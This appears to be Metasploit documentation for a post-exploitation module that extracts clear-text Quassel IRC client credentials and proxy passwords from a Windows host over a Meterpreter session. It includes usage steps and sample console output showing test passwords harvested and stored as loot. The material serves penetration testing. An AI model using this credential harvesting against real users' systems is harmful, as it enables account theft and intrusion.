## Vulnerable Application

This post-exploitation module extracts clear text credentials from the Quassel IRC Client.

The Quassel IRC Client is avaialble from (https://quassel-irc.org/downloads).

This module extracts information from the quasselclient.ini file in the "AppData\Roaming\quassel-irc.org" directory.

This module extracts server information such as host name, port, account name, password and proxy password.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/quasell_irc
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### Quassel Client v0.14.0 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Default Output
```
msf6 post(windows/gather/credentials/quassel_irc) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Quassel irc's Quasselclient.ini file found
[*] Downloading C:\Users\test\AppData\Roaming\quassel-irc.org\quasselclient.ini
[*] Quassel irc Quasselclient.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240507163717_default_10.0.0.2_QuasselIRCquass_570372.ini

[+] 1\HostName=10.245.100.2
[+] 2\HostName=10.0.0.3
[+] 1\Port=4242
[+] 2\Port=1234
[+] 1\AccountName=Test
[+] 2\AccountName=Test#2
[+] 1\Password=tiaspbiqe2r
[+] 2\Password=tiaspbiqe2r
[+] 1\ProxyHostName=localhost
[+] 2\ProxyHostName=
[+] 1\ProxyPort=8080
[+] 2\ProxyPort=8080
[+] 1\ProxyUser=test
[+] 2\ProxyUser=
[+] 1\ProxyPassword=tiaspbiqe2r
[+] 2\ProxyPassword=
[+] File with data saved:  /home/kali/.msf4/loot/20240507163717_default_10.0.0.2_EXTRACTIONquasse_134569.ini
[*] PackRat credential sweep Completed
[*] Post module execution completed

```

### Quassel Client v0.14.0 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Verbose Output
```
msf6 post(windows/gather/credentials/quassel_irc) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Quassel irc's base folder not found in user's user directory

[*] Starting Packrat...
[*] Quassel irc's base folder found
[*] Found the folder containing specified artifact for quasselclient.ini.
[*] Quassel irc's Quasselclient.ini file found
[*] Processing C:\Users\test\AppData\Roaming\quassel-irc.org
[*] Downloading C:\Users\test\AppData\Roaming\quassel-irc.org\quasselclient.ini
[*] Quassel irc Quasselclient.ini downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240507164141_default_10.0.0.2_QuasselIRCquass_310535.ini

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\HostName=10.245.100.2
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\HostName=10.0.0.3
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\Port=4242
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\Port=1234
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\AccountName=Test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\AccountName=Test#2
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\Password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\Password=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\ProxyHostName=localhost
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\ProxyHostName=
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\ProxyPort=8080
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\ProxyPort=8080
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\ProxyUser=test
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\ProxyUser=
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 1\ProxyPassword=tiaspbiqe2r
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] 2\ProxyPassword=
[+] File with data saved:  /home/kali/.msf4/loot/20240507164141_default_10.0.0.2_EXTRACTIONquasse_967148.ini
[*] PackRat credential sweep Completed
[*] Post module execution completed

```
